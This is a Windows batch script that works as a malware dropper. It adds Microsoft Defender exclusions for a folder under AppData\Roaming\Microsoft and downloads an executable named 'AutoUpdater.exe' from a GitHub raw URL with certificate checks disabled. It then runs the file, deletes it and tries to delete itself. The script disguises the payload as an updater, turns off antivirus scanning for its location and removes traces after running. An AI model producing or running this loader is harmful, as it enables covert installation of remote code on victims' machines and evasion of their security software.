@echo off
setlocal

:: Define the file name and URL
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"

:: Define the document path dynamically using USERPROFILE
set "docPath=%USERPROFILE%\AppData\Roaming\Microsoft"

:: Exclude the AutoUpdater file dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%\%file%'"

:: Exclude the folder dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%'"

:: Download the file
curl -k -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start /wait "" "%file%"

:: Delete the file
del /q "%file%"

:: Attempt to delete this script
start /b "" cmd /c del "%~f0"&exit

endlocal
